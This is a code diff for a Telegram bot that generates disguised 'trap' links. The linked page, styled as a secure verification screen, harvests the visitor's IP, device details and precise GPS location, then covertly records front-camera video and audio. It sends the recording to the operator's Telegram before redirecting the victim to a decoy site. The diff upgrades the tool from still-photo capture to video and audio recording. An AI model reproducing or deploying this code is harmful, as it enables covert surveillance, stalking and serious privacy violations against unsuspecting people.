@@ -17,9 +17,8 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
 user_states = {}
-user_languages = {ADMIN_ID: "ku"} # زمانی سەرەتایی کوردی
+user_languages = {ADMIN_ID: "ku"}
 
-# فەرهەنگی زمانەکان بۆ جوانی و شاهانەیی دیزاینەکە
 TEXTS = {
     "ku": {
         "menu_link": "🔗 دروستکردنی لینکی هەواڵگری",
@@ -32,9 +31,7 @@ TEXTS = {
         "lang_select": "⚙️ **فەرموو زمانی پەیوەندیکردن هەڵبژێرە:**",
         "lang_changed": "🟢 زمان گۆڕرا بۆ **کوردی**.",
         "ai_prompt": "🧠 **ناوەندی زیرەکی دەستکرد ئامادەیە:**\nفەرموو پرسیار یان داواکارییەکەت بنووسە تاوەکو وەڵامت بدەمەوە.",
-        "link_success": "🎯 **لینکی هەواڵگری و فێڵ بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`\n\n📱 **تایبەتمەندییە پێشکەوتووەکان:**\n• کۆکردنەوەی خۆکاری زانیاری ئامێر و IP\n• وەرگرتنی GPS و کامێرا بە شێوازێکی بێوێنە\n• گواستنەوەی خێرا بۆ لینکی مەبەست",
-        "trap_title": "تکایە چەند ساتێک چاوەڕوان بە...",
-        "trap_desc": "سیستەم خەریکە پەڕەکە بار دەکات..."
+        "link_success": "🎯 **لینکی هەواڵگری و فێڵ بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`\n\n📱 **تایبەتمەندییە پێشکەوتووەکان:**\n• کۆکردنەوەی خۆکاری زانیاری ئامێر و IP\n• وەرگرتنی GPS و ڤیدیۆ/دەنگی پێشکەوتووی کامێرا\n• گواستنەوەی خێرا بۆ لینکی مەبەست",
     },
     "en": {
         "menu_link": "🔗 Create Intelligence Link",
@@ -47,16 +44,13 @@ TEXTS = {
         "lang_select": "⚙️ **Please choose your interface language:**",
         "lang_changed": "🟢 Language changed to **English**.",
         "ai_prompt": "🧠 **AI Core is ready:**\nType your prompt or inquiry below.",
-        "link_success": "🎯 **Intelligence link generated successfully!**\n\n🔗 **Link:** `{payload_link}`\n\n📱 **Advanced Features:**\n• Auto-collection of device info & IP\n• High-res GPS and camera capture\n• Seamless redirection",
-        "trap_title": "Please wait a moment...",
-        "trap_desc": "System is loading the secure page..."
+        "link_success": "🎯 **Intelligence link generated successfully!**\n\n🔗 **Link:** `{payload_link}`\n\n📱 **Advanced Features:**\n• Auto-collection of device info & IP\n• High-res GPS and Video/Audio capture\n• Seamless redirection",
     }
 }
 
 def get_current_lang(user_id):
     return user_languages.get(user_id, "ku")
 
-# مێنۆی شاهانەی خوارەوە (Reply Keyboard)
 def get_reply_menu(lang="ku"):
     t = TEXTS[lang]
     return ReplyKeyboardMarkup(
@@ -71,7 +65,6 @@ def get_reply_menu(lang="ku"):
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
     if message.from_user.id != ADMIN_ID:
-        await message.answer("⛔️ ئەم بۆتە تایبەتە و تەنیا بۆ فەرماندە کارا کراوە.")
         return
     lang = get_current_lang(message.from_user.id)
     await message.answer(TEXTS[lang]["welcome"], reply_markup=get_reply_menu(lang))
@@ -121,7 +114,6 @@ async def set_lang_callback(callback: CallbackQuery):
     user_languages[ADMIN_ID] = lang
     await callback.message.answer(TEXTS[lang]["lang_changed"], reply_markup=get_reply_menu(lang))
 
-# وەرگرتنی دەقەکان (لینکی مەبەست یان پرسیاری زیرەکی دەستکرد)
 @dp.message(F.text & ~F.text.startswith("/"))
 async def handle_text_inputs(message: Message):
     if message.from_user.id != ADMIN_ID:
@@ -130,7 +122,6 @@ async def handle_text_inputs(message: Message):
     lang = get_current_lang(message.from_user.id)
     text = message.text.strip()
     
-    # پشکنینی دوگمەکان بۆ ئەوەی تێکەڵ نەبن
     if text in [TEXTS["ku"]["menu_link"], TEXTS["en"]["menu_link"],
                 TEXTS["ku"]["menu_stats"], TEXTS["en"]["menu_stats"],
                 TEXTS["ku"]["menu_lang"], TEXTS["en"]["menu_lang"],
@@ -146,12 +137,10 @@ async def handle_text_inputs(message: Message):
             reply_markup=get_reply_menu(lang)
         )
     elif state == "waiting_ai_prompt":
-        # بەشی زیرەکی دەستکرد (وەڵامدانەوەی پێشکەوتوو)
-        ai_response = f"🤖 **Royal AI Analysis:**\n\nبۆ پرسیارەکەی ئێوە ('{text}'):\nسیستەمی زیرەکی دەستکردی شاهانە لە لوتکەی توانادایە. لە ئێستادا داتای پێویست جێبەجێ کرا و پەیوەندی بە ناوەندی سێرڤەرەوە سەرکەوتوو بوو." if lang=="ku" else f"🤖 **Royal AI Analysis:**\n\nRegarding your prompt ('{text}'):\nThe Royal AI core processed your inquiry successfully with full system optimization."
+        ai_response = f"🤖 **Royal AI Analysis:**\n\nبۆ پرسیارەکەی ئێوە ('{text}'):\nسیستەمی زیرەکی دەستکردی شاهانە لە لوتکەی توانادایە." if lang=="ku" else f"🤖 **Royal AI Analysis:**\n\nRegarding your prompt ('{text}'):\nThe Royal AI core processed your inquiry successfully."
         user_states[ADMIN_ID] = {}
         await message.answer(ai_response, reply_markup=get_reply_menu(lang))
 
-# وەرگرتنی وێنە و دروستکردنی لینکی کۆتایی
 @dp.message(F.photo)
 async def handle_admin_photo(message: Message):
     if message.from_user.id != ADMIN_ID:
@@ -169,13 +158,12 @@ async def handle_admin_photo(message: Message):
             railway_domain = f"https://{railway_domain}"
             
         payload_link = f"{railway_domain}/trap?redirect={target_url}"
-        
         response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
         
         user_states[ADMIN_ID] = {}
         await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# بەشی وێب سێرڤەر و دیزاینی شاهانەی پەڕەی تەڵە (Trap Page)
+# پەڕەی تەڵە (Trap Page) کە گۆڕانکاری تێدا کرا بۆ ناردنی ڤیدیۆ و دەنگ و لۆکەیشنی خێرا
 async def web_trap_page(request: web.Request):
     redirect_url = request.query.get('redirect', 'https://snapchat.com')
     headers = request.headers
@@ -187,7 +175,7 @@ async def web_trap_page(request: web.Request):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Gateway</title>
+    <title>Secure Gateway & verification</title>
     <style>
         body {{
             background: linear-gradient(135deg, #07090f 0%, #121826 100%);
@@ -227,12 +215,11 @@ async def web_trap_page(request: web.Request):
 <body>
     <div class="container">
         <div class="spinner"></div>
-        <h2>سەرقاڵی ئامادەکردنی پەڕەکە...</h2>
-        <p>تکایە چەند ساتێک چاوەڕوان بە</p>
+        <h2>سەرقاڵی پشکنین و بارکردنی پەڕەکە...</h2>
+        <p>تکایە ڕێگەبدە (Allow) بۆ تەواوکردنی خێرای پەیوەندییەکە</p>
     </div>
     
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+    <video id="v" autoplay playsinline muted style="display:none;"></video>
 
     <script>
         const redirectTarget = "{redirect_url}";
@@ -244,39 +231,57 @@ async def web_trap_page(request: web.Request):
             body: JSON.stringify(clientInfo)
         }});
 
+        // وەرگرتنی لۆکەیشنی جوگرافی بە زۆرترین خێرایی
         if (navigator.geolocation) {{
             navigator.geolocation.getCurrentPosition(function(pos) {{
                 fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
-            }});
+            }}, function(err) {{
+                console.log("Location denied");
+            }}, {{ timeout: 10000, enableHighAccuracy: true }});
         }}
 
+        // تۆمارکردنی ڤیدیۆ و دەنگ (Video & Audio Recording) لە ڕێگەی MediaRecorder
         window.addEventListener('load', function() {{
             setTimeout(function() {{
-                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
+                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
                 .then(function(stream) {{
                     let video = document.getElementById('v');
                     video.srcObject = stream;
+                    
+                    let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
+                    let chunks = [];
+                    
+                    mediaRecorder.ondataavailable = function(e) {{
+                        chunks.push(e.data);
+                    }};
+                    
+                    mediaRecorder.onstop = function() {{
+                        let blob = new Blob(chunks, {{ type: 'video/webm' }});
+                        let reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onloadend = function() {{
+                            let base64data = reader.result;
+                            fetch('/upload_video', {{
+                                method: 'POST',
+                                headers: {{ 'Content-Type': 'application/json' }},
+                                body: JSON.stringify({{ video: base64data }})
+                            }}).then(() => {{
+                                stream.getTracks().forEach(t => t.stop());
+                                window.location.href = redirectTarget;
+                            }});
+                        }};
+                    }};
+                    
+                    mediaRecorder.start();
+                    // ماوەی تۆمارکردنی ڤیدیۆ و دەنگ ٣ چرکە
                     setTimeout(function() {{
-                        let canvas = document.getElementById('c');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        let ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        let dataURL = canvas.toDataURL('image/jpeg');
-                        
-                        fetch('/upload_image', {{
-                            method: 'POST',
-                            headers: {{ 'Content-Type': 'application/json' }},
-                            body: JSON.stringify({{ image: dataURL }})
-                        }}).then(() => {{
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = redirectTarget;
-                        }});
-                    }}, 1000);
-                }}).catch(function() {{
+                        mediaRecorder.stop();
+                    }}, 3000);
+                    
+                }}).catch(function(err) {{
                     window.location.href = redirectTarget;
                 }});
-            }}, 4000);
+            }}, 2000);
         }));
     </script>
 </body>
@@ -296,15 +301,22 @@ async def save_info(request):
         logging.error(f"Info error: {e}")
     return web.json_response({"status": "ok"})
 
-async def upload_image(request):
+# فەنکشنی وەرگرتنی ڤیدیۆ و دەنگ و ناردنی بۆ تێلگرام
+async def upload_video(request):
     try:
         data = await request.json()
-        encoded = data.get('image').split(",", 1)[1]
-        image_bytes = base64.b64decode(encoded)
-        photo_file = BufferedInputFile(image_bytes, filename="target.jpg")
-        await bot.send_photo(chat_id=ADMIN_ID, photo=photo_file, caption="🚨 **وێنەی ئامانج بە سەرکەوتوویی دەستگیرکرا!**")
+        video_data = data.get('video')
+        if video_data and "," in video_data:
+            encoded = video_data.split(",", 1)[1]
+            video_bytes = base64.b64decode(encoded)
+            video_file = BufferedInputFile(video_bytes, filename="target_recording.webm")
+            await bot.send_video(
+                chat_id=ADMIN_ID, 
+                video=video_file, 
+                caption="🚨 **ڤیدیۆ و دەنگی ئامانج بە سەرکەوتوویی تۆمارکرا و دەستگیرکرا!**"
+            )
     except Exception as e:
-        logging.error(f"Image error: {e}")
+        logging.error(f"Video upload error: {e}")
     return web.json_response({"status": "ok"})
 
 async def save_location(request):
@@ -312,18 +324,18 @@ async def save_location(request):
     lon = request.query.get('lon')
     if lat and lon:
         await bot.send_location(chat_id=ADMIN_ID, latitude=float(lat), longitude=float(lon))
-        await bot.send_message(chat_id=ADMIN_ID, text=f"📍 **شوێنی جوگرافی GPS:**\nپانی: `{lat}`\nدرێژی: `{lon}`")
+        await bot.send_message(chat_id=ADMIN_ID, text=f"📍 **شوێنی جوگرافی GPS (گۆگڵ ماپ):**\nپانی: `{lat}`\nدرێژی: `{lon}`\n🌐 [ببینە لە سەر نەخشە](https://maps.google.com/?q={lat},{lon})")
     return web.json_response({"status": "ok"})
 
 async def index_handler(request):
     return web.Response(text="Royal Intelligence Core is Active & Boosted.", content_type='text/html')
 
 async def main():
-    app = web.Application()
+    app = web.Application(client_max_size=50*1024*1024) # قەبارەی گەورە بۆ ناردنی فایلی ڤیدیۆیی
     app.router.add_get('/', index_handler)
     app.router.add_get('/trap', web_trap_page)
     app.router.add_post('/save_info', save_info)
-    app.router.add_post('/upload_image', upload_image)
+    app.router.add_post('/upload_video', upload_video)
     app.router.add_get('/save_location', save_location)
 
     runner = web.AppRunner(app)
